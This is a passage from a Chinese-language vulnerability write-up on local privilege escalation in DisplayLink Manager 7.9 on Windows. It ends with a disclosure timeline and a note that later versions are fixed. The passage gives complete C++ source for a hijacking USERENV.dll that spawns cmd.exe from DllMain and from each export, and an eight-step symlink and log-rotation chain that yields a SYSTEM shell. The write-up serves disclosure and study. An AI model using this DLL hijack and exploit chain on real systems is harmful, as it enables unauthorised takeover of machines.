    ---------       ----                                                                   ----    SHA256          B3C1196F2E9A45C71C31BC2B73A216025793A31FED1B0FBE6FD14106FC637C1D       C:WindowsSystem32target_ar...
至此，就实现了任意文件写入！我们在Procmon中查看相应条目，其中体现了将我们的任意文件移动到system32文件夹的日志轮换。
###  3.4 寻找丢失的DLL
那么，我们如何利用这个任意文件漏洞，来提升我们的权限呢？我们想到的第一个思路是尝试将`sethc.exe`替换为`cmd.exe`，以使用粘滞键弹出Shell。
但是，SYSTEM系统进程没有权限修改这些文件，只有`TrustedInstaller`具有这样的权限。当然，在具有特权的情况下，有一些技术可以实现这一目标，但是我们目前还没有成功提升权限，因此也无法利用这样的方法。
所以，我们选择了另外一个思路。我们看到DisplayLink
Manager尝试加载但失败的DLL，加载失败的原因在于它们没有位于加载器首先尝试加载它们的位置（根据标准DLL加载顺序）。因此，我们现在的思路是，使用自定义的DLL来替换这些丢失的DLL，可以使用简单的DLL劫持，以SYSTEM的身份执行任意代码。
因此，我们启动ProcMon，搜索DisplayLink Manager未成功加载的DLL：
我们可以看到，DisplayLink
Manager尝试加载文件夹中似乎缺失的几个DLL，例如：`VERSION.dll`、`USERENV.dll`和`dbghelp.dll`，这些也是在DLL劫持中的常见怀疑对象。
现在，如果我们成功地创建了一个文件，例如`C:Program FilesDisplayLink Core
SoftwareUSERENV.dll`，那么就可以以SYSTEM身份执行代码。上述之中的任何一个DLL都可以作为目标，而我通常会选择其中的`USERENV.dll`。
为了创建恶意DLL，我们首先来看看Display Manager从`USERENV.dll`导入的函数。为此，我将使用CFF Explorer。
通过查看，我们发现从`USERENV.dll`导入了几个函数，例如`wit`、`DestroyEnvironmentBlock`、`LoadUserProfileW`、`UnloadUserProfile`、`LoadUserProfileA`和`CreateEnvironmentBlock`。
随后，我们可以创建一个导出这些函数的DLL，但实际上会调用我们想要执行的命令。受到DLL劫持这篇文章的启发，我的代码实现如下：
    // dllmain.cpp : Defines the entry point for the DLL application.
    #include "pch.h"
    BOOL APIENTRY DllMain( HMODULE hModule,
                           DWORD  ul_reason_for_call,
                           LPVOID lpReserved
                         )
    {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
            WinExec("cmd.exe", SW_NORMAL);
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }
    extern "C" __declspec(dllexport) void DestroyEnvironmentBlock()
    {
        WinExec("cmd.exe", SW_NORMAL);
    }
    extern "C" __declspec(dllexport) void LoadUserProfileW()
    {
        WinExec("cmd.exe", SW_NORMAL);
    }
    extern "C" __declspec(dllexport) void UnloadUserProfile()
    {
        WinExec("cmd.exe", SW_NORMAL);
    }
    extern "C" __declspec(dllexport) void LoadUserProfileA()
    {
        WinExec("cmd.exe", SW_NORMAL);
    }
    extern "C" __declspec(dllexport) void CreateEnvironmentBlock()
    {
        WinExec("cmd.exe", SW_NORMAL);
    }
在这里，我只是调用进程使用的每个函数，并使其执行`cmd.exe`。接下来，我们对其进行编译和植入。
注意：在进行劫持时，需要静态编译DLL。
我们的DLL需要超过101KB时才能触发日志轮换，因此，如果文件太小，我们可以使用空字节对其进行填充。
## 四、完整漏洞利用链
接下来，可以将上面的所有内容串联起来了：
1、修改`C:Program FilesDisplayLink Core SoftwareDebug`的ACL，禁用SYSTEM的修改权限；
2、重新启动系统；
3、终止`DisplayLinkUI.exe`进程；
4、清空`C:Program FilesDisplayLink Core SoftwareDebug`文件夹；
5、使用`CreateSymlink.exe`，创建从`C:Program FilesDisplayLink Core
SoftwareDebugDisplayLinkManager.log`到恶意DLL的符号链接；
6、使用`CreateSymlink.exe`，创建从`C:Program FilesDisplayLink Core
SoftwareDebugDisplayLinkManager.old.log`到`C:Program FilesDisplayLink Core
SoftwareUSERENV.dll`的符号链接；
7、注销用户会话，然后重新登录。
8、成功实现漏洞利用。
至此，我们就获得了SYSTEM Shell。在这里，我们可以看到实际弹出了两个cmd.exe Shell，这是因为我们的恶意DLL是由DisplayLink
Manager（以SYSTEM运行）和DisplayLink UI Systray（以当前用户运行）加载的。因此，我们的Payload会执行两次。
其次，我们很幸运能在桌面上弹出一个Shell。这是因为DisplayLink
Manager在我们的会话中启动一个进程，然后加载DLL。因此，命令行就可以在我们的图形化Windows会话中弹出。
如果它在session
0中运行，cmd.exe就不会出现在我们的桌面上，当然，在这种情况下我们的Payload仍然可以执行，但我们可能需要更复杂的Payload才能在用户会话中创建进程。
## 五、总结
通过这一漏洞的利用，我们在客户端的计算机上找到了本地权限提升的路径，而这一漏洞利用不会受到任何配置的干扰。
在后续版本中，Debug文件夹已经不再存在，开发者通过调整安装文件夹中的结构来规避了存在问题的ACL。
## 六、时间节点
2020年4月23日 通知厂商软件的7.9版本中存在漏洞，但7.9以后的版本似乎没有受到影响。  
2020年4月23日 收到厂商回复，表示7.9版本与Windows 10不兼容，并且存在潜在的不稳定性，建议避免在Windows 10上使用该软件。  
2020年4月28日 收到GPG密钥，用于将加密后的安全建议发送至DisplayLink安全团队。  
2020年4月29日 向DisplayLink安全团队发送安全建议。  
2020年4月30日 DisplayLink安全团队确认收到安全建议。  
2020年5月15日 DisplayLink确认7.9以上版本不受影响。  
2020年7月1日 发布文章。